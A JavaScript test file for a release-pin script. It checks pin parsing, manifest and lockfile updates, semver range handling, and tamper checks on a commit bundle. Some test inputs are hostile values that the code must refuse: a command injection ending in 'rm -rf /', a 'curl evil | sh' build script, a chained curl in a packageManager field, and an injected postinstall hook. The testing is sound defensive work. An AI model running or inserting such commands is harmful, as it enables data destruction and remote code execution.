// Tests for scripts/release-pin.mjs (EP-1747 phase 5): input validation, where
// each manifest takes its pin, ranges (kept across a prerelease pin), never moving
// back, the lockfile check, and what the commit may contain.
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import {
  addCommand,
  apply,
  backwardsRefusal,
  commitMessage,
  dependencyField,
  lockedVersion,
  ownerOf,
  parsePins,
  pinnedSpec,
  planPin,
  releaseFromBranch,
  workspacePackages,
} from '../scripts/release-pin.mjs';

test('only a Release branch is accepted', () => {
  assert.deepEqual(releaseFromBranch('release/RL-7'), { release: 'RL-7', n: 7 });
  for (const branch of ['main', 'staging', 'release/0.2.0', 'release/RL-07', 'release/RL-7-x', 'refs/heads/release/RL-7', 'release/RL-', '']) {
    assert.throws(() => releaseFromBranch(branch), /refusing branch/, branch);
  }
});

test('pins are exact revt-eng versions, prereleases only from the same Release', () => {
  assert.deepEqual(parsePins('@revt-eng/schema@0.1.562-rl.7.40  @revturbine/sdk@0.17.1', 7), [
    { name: '@revt-eng/schema', version: '0.1.562-rl.7.40' },
    { name: '@revturbine/sdk', version: '0.17.1' },
  ]);
  const refused = {
    'left-pad@1.3.0': /not a revt-eng package/,
    '@revturbine/other@1.0.0': /not a revt-eng package/,
    '@revt-eng/schema@^0.1.562': /exact/,
    '@revt-eng/schema@latest': /exact/,
    '@revt-eng/schema@rl-7': /exact/,
    '@revt-eng/schema@0.1': /exact/,
    '@revt-eng/schema@0.1.562+build.1': /exact/,
    '@revt-eng/schema': /not a revt-eng package/,
    '@revt-eng/schema@0.1.562-rl.6.40': /one of RL-7's/,
    '@revt-eng/schema@0.1.562-beta.1': /one of RL-7's/,
    '@revt-eng/schema@0.1.562;rm -rf /': /exact/,
    '@revt-eng/a@1.0.0 @revt-eng/a@1.0.1': /given twice/,
    '': /no package given/,
  };
  for (const [text, error] of Object.entries(refused)) assert.throws(() => parsePins(text, 7), error, text);
});

test('the commit message names every pin and the Release', () => {
  assert.equal(commitMessage([{ name: '@revt-eng/sdk', version: '0.17.1-rl.7.3' }], 'RL-7'), 'Pin @revt-eng/sdk@0.17.1-rl.7.3 for RL-7');
  assert.equal(commitMessage([{ name: 'a', version: '1.0.0' }, { name: 'b', version: '2.0.0' }], 'RL-7'), 'Pin a@1.0.0, b@2.0.0 for RL-7');
});

test('a pin keeps the dependency field and skips peer-only and protocol specifiers', () => {
  assert.equal(dependencyField({ devDependencies: { '@revturbine/cli': '0.19.1' } }, '@revturbine/cli'), 'devDependencies');
  assert.equal(dependencyField({ dependencies: { '@revt-eng/schema': 'workspace:*' } }, '@revt-eng/schema'), null);
  assert.equal(dependencyField({ peerDependencies: { '@revt-eng/schema': '0.1.0' } }, '@revt-eng/schema'), null);
  assert.equal(dependencyField({}, '@revt-eng/schema'), null);
});

test('pnpm workspace package lists parse in block and inline form', () => {
  assert.deepEqual(workspacePackages("packages:\n  - web-sdk\n  - 'server-node'\nshamefullyHoist: true\n"), ['web-sdk', 'server-node']);
  assert.deepEqual(workspacePackages('packages: []\n'), []);
  assert.deepEqual(workspacePackages("packages: ['apps/*']\n"), ['apps/*']);
  assert.deepEqual(workspacePackages('useNodeVersion: 24.21.0\n'), []);
});

function repo(files) {
  const root = mkdtempSync(path.join(os.tmpdir(), 'release-pin-'));
  for (const [file, content] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(root, file)), { recursive: true });
    writeFileSync(path.join(root, file), typeof content === 'string' ? content : `${JSON.stringify(content, null, 2)}\n`);
  }
  const git = (...args) => execFileSync('git', args, { cwd: root, stdio: 'pipe' });
  git('init', '-q');
  git('-c', 'core.autocrlf=false', 'add', '-A');
  git('-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'init');
  return root;
}

test('each manifest directory takes the pin through the lockfile that covers it', () => {
  const root = repo({
    'package.json': { name: 'root' },
    'pnpm-lock.yaml': '',
    'pnpm-workspace.yaml': 'packages:\n  - web-sdk\n',
    'web-sdk/package.json': { name: 'web-sdk' },
    'pages-build/package.json': { name: 'pages' },
    'pages-build/pnpm-lock.yaml': '',
    'pages-build/pnpm-workspace.yaml': 'packages: []\n',
    'examples/app/package.json': { name: 'app' },
    'examples/app/package-lock.json': '{}',
    'loose/package.json': { name: 'loose' },
  });
  assert.deepEqual(ownerOf(root, '.'), { pm: 'pnpm', workspaceRoot: true, lock: 'pnpm-lock.yaml', importer: '.' });
  assert.deepEqual(ownerOf(root, 'web-sdk'), { pm: 'pnpm', workspaceRoot: false, lock: 'pnpm-lock.yaml', importer: 'web-sdk' });
  assert.deepEqual(ownerOf(root, 'pages-build'), { pm: 'pnpm', workspaceRoot: true, lock: 'pages-build/pnpm-lock.yaml', importer: '.' });
  assert.deepEqual(ownerOf(root, 'examples/app'), { pm: 'npm', lock: 'examples/app/package-lock.json', importer: '.' });
  assert.deepEqual(ownerOf(root, 'loose'), { pm: null });
  assert.deepEqual(addCommand({ pm: 'pnpm', workspaceRoot: true }, 'dependencies', ['a@1.0.0']), ['pnpm', ['add', '--save-exact', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git', '--save-prod', '--workspace-root', 'a@1.0.0']]);
  assert.deepEqual(addCommand({ pm: 'npm' }, 'devDependencies', ['a@1.0.0']), ['npm', ['install', '--save-exact', '--ignore-scripts', '--git=git', '--save-dev', 'a@1.0.0']]);
});

// A fake package manager: an exact add rewrites the spec in package.json, and every
// command rewrites the lockfile from what it has resolved (resolveTo overrides a
// resolution, to make a lockfile disagree with the pin).
function fakeAdd(root, calls, { extra, resolveTo } = {}) {
  const resolved = new Map();
  return (command, args, { cwd }) => {
    const dir = path.relative(root, cwd).replaceAll('\\', '/') || '.';
    calls.push([dir, command, ...args]);
    const owner = ownerOf(root, dir);
    const file = path.join(cwd, 'package.json');
    const manifest = JSON.parse(readFileSync(file, 'utf8'));
    if (!resolved.has(owner.lock)) resolved.set(owner.lock, new Map());
    const importers = resolved.get(owner.lock);
    if (!importers.has(owner.importer)) importers.set(owner.importer, new Map());
    const deps = importers.get(owner.importer);
    for (const field of ['dependencies', 'devDependencies', 'optionalDependencies']) {
      for (const [name, spec] of Object.entries(manifest[field] ?? {})) if (!deps.has(name) && /^\d/.test(spec)) deps.set(name, spec);
    }
    for (const spec of args.filter((arg) => arg.includes('@') && !arg.startsWith('-'))) {
      const at = spec.lastIndexOf('@');
      const name = spec.slice(0, at);
      for (const field of ['dependencies', 'devDependencies', 'optionalDependencies']) {
        if (manifest[field]?.[name]) manifest[field][name] = spec.slice(at + 1);
      }
      deps.set(name, resolveTo?.[name] ?? spec.slice(at + 1));
    }
    writeFileSync(file, `${JSON.stringify(manifest, null, 2)}\n`);
    const lockFile = path.join(root, owner.lock);
    if (owner.pm === 'npm') {
      writeFileSync(lockFile, `${JSON.stringify({ packages: Object.fromEntries([...deps].map(([n, v]) => [`node_modules/${n}`, { version: v }])) }, null, 2)}\n`);
    } else {
      const lines = ["lockfileVersion: '9.0'", '', 'importers:', ''];
      for (const [importer, list] of importers) {
        lines.push(`  ${importer}:`, '    dependencies:');
        for (const [n, v] of list) lines.push(`      '${n}':`, `        specifier: ${v}`, `        version: ${v}(peer@1.0.0)`);
        lines.push('');
      }
      writeFileSync(lockFile, `${lines.join('\n')}\n`);
    }
    extra?.(cwd);
    return { status: 0 };
  };
}

test('apply pins every manifest that depends on the package and reports only manifests and lockfiles', () => {
  const root = repo({
    'package.json': { name: 'root', dependencies: { '@revt-eng/schema': '0.1.561' } },
    'pnpm-lock.yaml': '',
    'pnpm-workspace.yaml': 'packages:\n  - web-sdk\n',
    'web-sdk/package.json': { name: 'web-sdk', devDependencies: { '@revt-eng/schema': '0.1.561' } },
    'loose/package.json': { name: 'loose', dependencies: { '@revt-eng/schema': '0.1.500' } },
    'tests/fixtures/x/package.json': { name: 'fixture', dependencies: { '@revt-eng/schema': '0.0.1' } },
    'README.md': 'readme\n',
  });
  const calls = [];
  const pins = parsePins('@revt-eng/schema@0.1.562-rl.7.40', 7);
  const result = apply({ root, pins, release: 'RL-7', run: fakeAdd(root, calls) });
  assert.deepEqual(calls, [
    ['.', 'pnpm', 'add', '--save-exact', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git', '--save-prod', '--workspace-root', '@revt-eng/schema@0.1.562-rl.7.40'],
    ['web-sdk', 'pnpm', 'add', '--save-exact', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git', '--save-dev', '@revt-eng/schema@0.1.562-rl.7.40'],
  ]);
  assert.equal(JSON.parse(readFileSync(path.join(root, 'loose/package.json'), 'utf8')).dependencies['@revt-eng/schema'], '0.1.562-rl.7.40');
  assert.equal(JSON.parse(readFileSync(path.join(root, 'tests/fixtures/x/package.json'), 'utf8')).dependencies['@revt-eng/schema'], '0.0.1');
  assert.deepEqual(result.files, ['loose/package.json', 'package.json', 'pnpm-lock.yaml', 'web-sdk/package.json']);
  assert.equal(result.message, 'Pin @revt-eng/schema@0.1.562-rl.7.40 for RL-7');

  const again = apply({ root, pins, release: 'RL-7', run: fakeAdd(root, []) });
  assert.equal(again.files.length, 4, 'nothing new was run; the earlier changes are still uncommitted');
});

test('apply refuses a package the repository does not depend on, and a change outside manifests and lockfiles', () => {
  const root = repo({ 'package.json': { name: 'root', dependencies: { '@revt-eng/schema': '0.1.561' } }, 'package-lock.json': '{}', 'README.md': 'readme\n' });
  assert.throws(() => apply({ root, pins: parsePins('@revt-eng/core@0.1.562', 7), release: 'RL-7', run: fakeAdd(root, []) }), /not a dependency/);
  const touchReadme = (cwd) => writeFileSync(path.join(cwd, 'README.md'), 'changed\n');
  assert.throws(() => apply({ root, pins: parsePins('@revt-eng/schema@0.1.562', 7), release: 'RL-7', run: fakeAdd(root, [], { extra: touchReadme }) }), /outside manifests and lockfiles: README\.md/);
});

test('a manifest that already pins the version is left alone', () => {
  const root = repo({ 'package.json': { name: 'root', devDependencies: { '@revturbine/cli': '0.21.20' } }, 'package-lock.json': '{}' });
  const calls = [];
  const result = apply({ root, pins: parsePins('@revturbine/cli@0.21.20', 7), release: 'RL-7', run: fakeAdd(root, calls) });
  assert.deepEqual(calls, []);
  assert.deepEqual(result.files, []);
});

test("a prerelease pins exactly; a release keeps a range's form and upper bound and raises its lower bound", () => {
  assert.equal(pinnedSpec('>=0.12.5 <1', '0.13.0-rl.7.4'), '0.13.0-rl.7.4');
  assert.equal(pinnedSpec('0.12.5', '0.13.0'), '0.13.0', 'an exact specifier stays exact');
  assert.equal(pinnedSpec('>=0.12.5 <1', '0.13.0'), '>=0.13.0 <1');
  assert.equal(pinnedSpec('>=0.11.0  <1', '0.17.1'), '>=0.17.1  <1', 'spacing is kept');
  assert.equal(pinnedSpec('^0.12.5', '0.13.0'), '^0.13.0');
  assert.equal(pinnedSpec('~1.2.3', '1.2.9'), '~1.2.9');
  assert.equal(pinnedSpec('>1.0.0 <=2.0.0', '1.0.5'), '>=1.0.5 <=2.0.0');
  assert.equal(pinnedSpec('1.0.0 - 2.0.0', '1.5.0'), '1.5.0 - 2.0.0');
  const refused = {
    '>=0.12.5 <1': ['1.0.0', /upper bound <1 excludes it/],
    '>=0.13.0 <1': ['0.12.9', /below its lower bound 0\.13\.0/],
    '^1.0.0 || ^2.0.0': ['2.1.0', /union/],
    '*': ['1.0.0', /not a comparator/],
    '1.x': ['1.2.0', /not a comparator/],
    '<1': ['0.5.0', /no lower bound/],
    '>=1.0.0 >=1.1.0': ['1.2.0', /more than one lower bound/],
  };
  for (const [range, [version, error]] of Object.entries(refused)) assert.throws(() => pinnedSpec(range, version), error, range);
});

test('a pin never moves a manifest back to an earlier build of the same Release', () => {
  assert.match(backwardsRefusal('0.1.562-rl.7.41', '0.1.562-rl.7.40', 7, 'x'), /back from 0\.1\.562-rl\.7\.41 to 0\.1\.562-rl\.7\.40: build 41 of RL-7 is later than build 40/);
  assert.equal(backwardsRefusal('0.1.562-rl.7.39', '0.1.562-rl.7.40', 7, 'x'), null);
  assert.equal(backwardsRefusal('0.1.562-rl.6.90', '0.1.562-rl.7.1', 7, 'x'), null, 'another Release: semver, and RL-7 sorts after RL-6');
  assert.equal(backwardsRefusal('0.1.561', '0.1.562-rl.7.1', 7, 'x'), null);
  assert.equal(backwardsRefusal('0.2.0-rl.7.40', '0.1.562-rl.7.41', 7, 'x'), null, 'a reverted bump: build 41 is newer though its version is lower');
  assert.match(backwardsRefusal('0.1.562-rl.7.41', '0.2.0-rl.7.40', 7, 'x'), /build 41 of RL-7 is later than build 40/, 'within a Release the build number decides, not semver');
  assert.match(backwardsRefusal('0.1.563', '0.1.562-rl.7.1', 7, 'x'), /0\.1\.563 is later/, 'a prerelease against a release: semver');
  assert.equal(backwardsRefusal('>=0.12.5 <1', '0.1.0', 7, 'x'), null, 'a range is checked by raiseLowerBound');

  const root = repo({ 'package.json': { name: 'root', dependencies: { '@revt-eng/schema': '0.1.562-rl.7.41' } }, 'package-lock.json': '{}' });
  const calls = [];
  assert.throws(() => apply({ root, pins: parsePins('@revt-eng/schema@0.1.562-rl.7.40', 7), release: 'RL-7', run: fakeAdd(root, calls) }), /refusing to pin @revt-eng\/schema in package\.json back from 0\.1\.562-rl\.7\.41/);
  assert.deepEqual(calls, [], 'nothing ran');
});

test('a release pinned over a range: the exact add resolves it, then the raised range is written back with a lockfile-only install', () => {
  const root = repo({
    'package.json': { name: 'root', dependencies: { '@revturbine/sdk': '>=0.12.5 <1' }, devDependencies: { '@revt-eng/core': '0.1.561' } },
    'package-lock.json': '{}',
  });
  const calls = [];
  const result = apply({ root, pins: parsePins('@revturbine/sdk@0.17.1 @revt-eng/core@0.1.562', 7), release: 'RL-7', run: fakeAdd(root, calls) });
  assert.deepEqual(calls, [
    ['.', 'npm', 'install', '--save-exact', '--ignore-scripts', '--git=git', '--save-prod', '@revturbine/sdk@0.17.1'],
    ['.', 'npm', 'install', '--save-exact', '--ignore-scripts', '--git=git', '--save-dev', '@revt-eng/core@0.1.562'],
    ['.', 'npm', 'install', '--package-lock-only', '--ignore-scripts', '--git=git'],
  ]);
  const manifest = JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8'));
  assert.equal(manifest.dependencies['@revturbine/sdk'], '>=0.17.1 <1');
  assert.equal(manifest.devDependencies['@revt-eng/core'], '0.1.562');
  assert.deepEqual(result.files, ['package-lock.json', 'package.json']);
  assert.deepEqual(apply({ root, pins: parsePins('@revturbine/sdk@0.17.1', 7), release: 'RL-7', run: fakeAdd(root, []) }).files.length, 2, 'already pinned: nothing more runs');
});

test('a range replaced by a prerelease pin is recorded, and the final pin restores it with the new lower bound', () => {
  assert.deepEqual(planPin('>=0.12.5 <1', '0.13.0-rl.7.4', undefined), { spec: '0.13.0-rl.7.4', record: '>=0.12.5 <1' });
  assert.deepEqual(planPin('0.13.0-rl.7.4', '0.13.0-rl.7.9', '>=0.12.5 <1'), { spec: '0.13.0-rl.7.9', record: '>=0.12.5 <1' });
  assert.deepEqual(planPin('0.13.0-rl.7.9', '0.13.0', '>=0.12.5 <1'), { spec: '>=0.13.0 <1', record: undefined });
  assert.deepEqual(planPin('0.1.561', '0.1.562-rl.7.4', undefined), { spec: '0.1.562-rl.7.4', record: undefined }, 'an exact specifier records nothing');
  assert.deepEqual(planPin('0.1.562-rl.7.4', '0.1.562', undefined), { spec: '0.1.562', record: undefined });

  const root = repo({ 'package.json': { name: 'root', dependencies: { '@revturbine/sdk': '>=0.12.5 <1' } }, 'package-lock.json': '{}' });
  const git = (...args) => execFileSync('git', args, { cwd: root, stdio: 'pipe' });
  const commit = (files) => {
    git('-c', 'core.autocrlf=false', 'add', '-A', '--', ...files);
    git('-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'pin');
  };
  const run = fakeAdd(root, []);
  const first = apply({ root, pins: parsePins('@revturbine/sdk@0.13.0-rl.7.4', 7), release: 'RL-7', run });
  assert.deepEqual(first.files, ['.release-pins.json', 'package-lock.json', 'package.json'], 'the new record file is part of the commit');
  assert.deepEqual(JSON.parse(readFileSync(path.join(root, '.release-pins.json'), 'utf8')), { 'package.json': { '@revturbine/sdk': '>=0.12.5 <1' } });
  assert.equal(JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8')).dependencies['@revturbine/sdk'], '0.13.0-rl.7.4');
  commit(first.files);

  const second = apply({ root, pins: parsePins('@revturbine/sdk@0.13.0-rl.7.9', 7), release: 'RL-7', run });
  assert.deepEqual(second.files, ['package-lock.json', 'package.json'], 'the record is kept as it was');
  commit(second.files);

  const final = apply({ root, pins: parsePins('@revturbine/sdk@0.13.0', 7), release: 'RL-7', run });
  assert.equal(JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8')).dependencies['@revturbine/sdk'], '>=0.13.0 <1');
  assert.ok(!existsSync(path.join(root, '.release-pins.json')), 'the last record goes, and the file with it');
  assert.deepEqual(final.files, ['.release-pins.json', 'package-lock.json', 'package.json'], 'the deletion is part of the commit');
});

test('the lockfile must resolve exactly the pinned version', () => {
  assert.equal(lockedVersion({ pm: 'pnpm', importer: 'web-sdk', text: "importers:\n\n  .:\n    dependencies:\n      a:\n        specifier: 1.0.0\n        version: 1.0.0\n\n  web-sdk:\n    devDependencies:\n      '@revt-eng/schema':\n        specifier: 0.1.562-rl.7.4\n        version: 0.1.562-rl.7.4(zod@4.4.3)\n\npackages:\n" }, '@revt-eng/schema'), '0.1.562-rl.7.4');
  assert.equal(lockedVersion({ pm: 'npm', importer: '.', text: JSON.stringify({ packages: { 'node_modules/@revturbine/sdk': { version: '0.17.0' } } }) }, '@revturbine/sdk'), '0.17.0');

  const root = repo({ 'package.json': { name: 'root', dependencies: { '@revturbine/sdk': '>=0.12.5 <1' } }, 'package-lock.json': '{}' });
  assert.throws(
    () => apply({ root, pins: parsePins('@revturbine/sdk@0.17.0', 7), release: 'RL-7', run: fakeAdd(root, [], { resolveTo: { '@revturbine/sdk': '0.17.2' } }) }),
    /package-lock\.json resolves @revturbine\/sdk to 0\.17\.2 for \., not the pinned 0\.17\.0/,
  );
});

// EP-1747 phase 7: the pin job runs the package manager with no secrets and bundles the result; the push job runs
// nothing from the Release branch, checks the bundle against the branch head and commits it with git plumbing.
import {
  addCommand as safeAdd,
  commitBundle as bundleCommit,
  lockfileCommand as safeLockfile,
  manifestPinRefusal,
  packageManagerSpec,
  pinnablePath,
  recordsRefusal,
  workspacePinRefusal,
  writeBundle,
} from '../scripts/release-pin.mjs';

test('only a released npm, pnpm or yarn is installed as the packageManager', () => {
  assert.equal(packageManagerSpec('pnpm@10.33.0'), 'pnpm@10.33.0');
  assert.equal(packageManagerSpec('npm@11.18.0'), 'npm@11.18.0');
  assert.equal(packageManagerSpec('pnpm@11.13.1+sha512.Zm9vYmFy0123'), 'pnpm@11.13.1');
  assert.equal(packageManagerSpec(undefined), null);
  for (const bad of ['pnpm@latest', 'pnpm@^10.0.0', 'evil@1.0.0', 'pnpm@10.0.0 && curl x', 'pnpm@https://x/y.tgz', 'pnpm@10.0.0-rc.1', 'pnpm@10.0.0+sha512.a b', 7]) {
    assert.throws(() => packageManagerSpec(bad), /refusing packageManager/, String(bad));
  }
});

test('the package manager runs with no scripts, no pnpmfile and the runner git', () => {
  assert.deepEqual(safeAdd({ pm: 'pnpm', workspaceRoot: false }, 'dependencies', ['a@1.0.0']),
    ['pnpm', ['add', '--save-exact', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git', '--save-prod', 'a@1.0.0']]);
  assert.deepEqual(safeAdd({ pm: 'npm' }, 'devDependencies', ['a@1.0.0']), ['npm', ['install', '--save-exact', '--ignore-scripts', '--git=git', '--save-dev', 'a@1.0.0']]);
  assert.deepEqual(safeLockfile({ pm: 'pnpm' }), ['pnpm', ['install', '--lockfile-only', '--no-frozen-lockfile', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git']]);
  assert.deepEqual(safeLockfile({ pm: 'npm' }), ['npm', ['install', '--package-lock-only', '--ignore-scripts', '--git=git']]);
});

test('only manifests, lockfiles, pnpm-workspace.yaml and .release-pins.json are pinnable paths', () => {
  for (const ok of ['package.json', 'web-sdk/package.json', 'pnpm-lock.yaml', 'a/package-lock.json', 'npm-shrinkwrap.json', 'pnpm-workspace.yaml', '.release-pins.json']) assert.equal(pinnablePath(ok), true, ok);
  for (const bad of ['.github/workflows/x.yml', 'scripts/package.json.mjs', '../package.json', '/package.json', 'a/../package.json', 'node_modules/x/package.json', '.git/package.json', 'a\\package.json', 'a//package.json', 'x/.release-pins.json', '', null]) {
    assert.equal(pinnablePath(bad), false, String(bad));
  }
});

test('a manifest may change only in the pinned dependencies, to what apply writes', () => {
  const pins = [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.3' }];
  const before = JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '^1.3.0', other: '1.0.0' } });
  const pinned = (over) => JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3', other: '1.0.0' }, ...over });
  assert.equal(manifestPinRefusal('package.json', before, pinned(), pins, 7, {}), null);
  assert.match(manifestPinRefusal('package.json', before, pinned({ scripts: { build: 'curl evil | sh' } }), pins, 7, {}), /more than the pinned dependencies/);
  assert.match(manifestPinRefusal('package.json', before, JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3', other: '9.9.9' } }), pins, 7, {}), /more than/);
  assert.match(manifestPinRefusal('package.json', before, JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.2', other: '1.0.0' } }), pins, 7, {}), /not the pin's 1\.4\.0-rl\.7\.3/);
  assert.match(manifestPinRefusal('package.json', before, JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { other: '1.0.0' }, devDependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3' } }), pins, 7, {}), /more than/, 'a pin keeps the field');
  assert.match(manifestPinRefusal('package.json', before, before, pins, 7, {}), /pins nothing/);
  // A final pin restores the range recorded when the prerelease was pinned.
  const final = [{ name: '@revt-eng/sdk', version: '1.4.0' }];
  const records = { 'package.json': { '@revt-eng/sdk': '^1.3.0' } };
  const atPrerelease = pinned();
  assert.equal(manifestPinRefusal('package.json', atPrerelease, JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '^1.4.0', other: '1.0.0' } }), final, 7, records), null);
  assert.match(manifestPinRefusal('package.json', atPrerelease, pinned({ dependencies: { '@revt-eng/sdk': '1.4.0', other: '1.0.0' } }), final, 7, records), /not the pin's \^1\.4\.0/);
});

test('pnpm-workspace.yaml and .release-pins.json change only for the pinned packages', () => {
  const pins = [{ name: '@revt-eng/sdk', version: '1.4.0' }];
  assert.equal(workspacePinRefusal('pnpm-workspace.yaml', 'packages:\n  - a\n', 'packages:\n  - a\nminimumReleaseAgeExclude:\n  - "@revt-eng/sdk@1.4.0"\n', pins), null);
  assert.match(workspacePinRefusal('pnpm-workspace.yaml', 'packages:\n  - a\n', 'packages:\n  - a\nonlyBuiltDependencies:\n  - evil\n', pins), /names no pinned package/);
  assert.equal(recordsRefusal({ 'package.json': { '@revt-eng/sdk': '^1.3.0' } }, null, pins), null);
  assert.equal(recordsRefusal({}, JSON.stringify({ 'web-sdk/package.json': { '@revt-eng/sdk': '^1.3.0' } }), pins), null);
  assert.match(recordsRefusal({}, JSON.stringify({ 'package.json': { other: '^1' } }), pins), /not being pinned/);
  assert.match(recordsRefusal({}, JSON.stringify({ '.github/x.yml': {} }), pins), /not a manifest/);
});

test('the push job commits a checked bundle on the head it was pinned on, and nothing else', () => {
  const work = mkdtempSync(path.join(os.tmpdir(), 'release-pin-bundle-'));
  const src = path.join(work, 'src');
  const run = (cwd, args, input, env = {}) => execFileSync('git', args, { cwd, input, encoding: 'utf8', env: { ...process.env, ...env } });
  mkdirSync(src);
  run(src, ['init', '-q', '-b', 'release/RL-7']);
  const manifest = { name: 'x', dependencies: { '@revt-eng/sdk': '^1.3.0' } };
  writeFileSync(path.join(src, 'package.json'), `${JSON.stringify(manifest, null, 2)}\n`);
  writeFileSync(path.join(src, 'package-lock.json'), '{"lockfileVersion":3}\n');
  writeFileSync(path.join(src, 'build.sh'), 'echo hi\n');
  const id = { GIT_AUTHOR_NAME: 'pin', GIT_AUTHOR_EMAIL: 'pin@example.com', GIT_COMMITTER_NAME: 'pin', GIT_COMMITTER_EMAIL: 'pin@example.com' };
  run(src, ['add', '.']);
  run(src, ['commit', '-q', '-m', 'base'], undefined, id);
  const tip = run(src, ['rev-parse', 'HEAD']).trim();
  const bare = path.join(work, 'bare.git');
  run(work, ['clone', '-q', '--bare', src, bare]);
  const git = (args, input, env = {}) => run(work, ['--git-dir', bare, ...args], input, { ...id, ...env });

  const pins = [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.3' }];
  writeFileSync(path.join(src, 'package.json'), `${JSON.stringify({ ...manifest, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3' } }, null, 2)}\n`);
  writeFileSync(path.join(src, 'package-lock.json'), '{"lockfileVersion":3,"pinned":true}\n');
  writeFileSync(path.join(src, '.release-pins.json'), `${JSON.stringify({ 'package.json': { '@revt-eng/sdk': '^1.3.0' } })}\n`);
  const bundle = path.join(work, 'bundle');
  writeBundle(src, { release: 'RL-7', pins, files: ['.release-pins.json', 'package-lock.json', 'package.json'] }, bundle, tip);

  const done = bundleCommit({ bundle, tip, pins, release: 'RL-7', n: 7, git });
  assert.deepEqual(done.files, ['.release-pins.json', 'package-lock.json', 'package.json']);
  assert.equal(git(['log', '-1', '--format=%P %s', done.sha]).trim(), `${tip} Pin @revt-eng/sdk@1.4.0-rl.7.3 for RL-7`);
  assert.equal(git(['diff', '--name-only', tip, done.sha]).trim().split('\n').sort().join(' '), '.release-pins.json package-lock.json package.json');
  assert.equal(git(['cat-file', 'blob', `${done.sha}:build.sh`]), 'echo hi\n', 'files outside the bundle are the head\'s');

  assert.deepEqual(bundleCommit({ bundle, tip: 'f'.repeat(40), pins, release: 'RL-7', n: 7, git }).moved, true, 'a moved head is reported, not committed');
  assert.throws(() => bundleCommit({ bundle, tip, pins: [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.4' }], release: 'RL-7', n: 7, git }), /other packages/);

  const tampered = (mutate) => {
    const dir = mkdtempSync(path.join(work, 'tampered-'));
    writeBundle(src, { release: 'RL-7', pins, files: ['package.json'] }, dir, tip);
    mutate(dir);
    return () => bundleCommit({ bundle: dir, tip, pins, release: 'RL-7', n: 7, git });
  };
  const manifestOf = (dir) => JSON.parse(readFileSync(path.join(dir, 'manifest.json'), 'utf8'));
  const rewrite = (dir, value) => writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(value));
  assert.throws(tampered((dir) => rewrite(dir, { ...manifestOf(dir), files: [{ path: 'build.sh', deleted: false }] })), /refusing "build\.sh"/);
  assert.throws(tampered((dir) => rewrite(dir, { ...manifestOf(dir), files: [{ path: 'package.json', deleted: true }] })), /deletes only/);
  assert.throws(tampered((dir) => writeFileSync(path.join(dir, 'files', 'package.json'), JSON.stringify({ ...manifest, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3' }, scripts: { postinstall: 'x' } }))), /more than the pinned/);
  assert.throws(tampered((dir) => { mkdirSync(path.join(dir, 'files', 'b'), { recursive: true }); writeFileSync(path.join(dir, 'files', 'b', 'package-lock.json'), '{}'); rewrite(dir, { ...manifestOf(dir), files: [...manifestOf(dir).files, { path: 'b/package-lock.json', deleted: false }] }); }), /adds b\/package-lock\.json/);
});
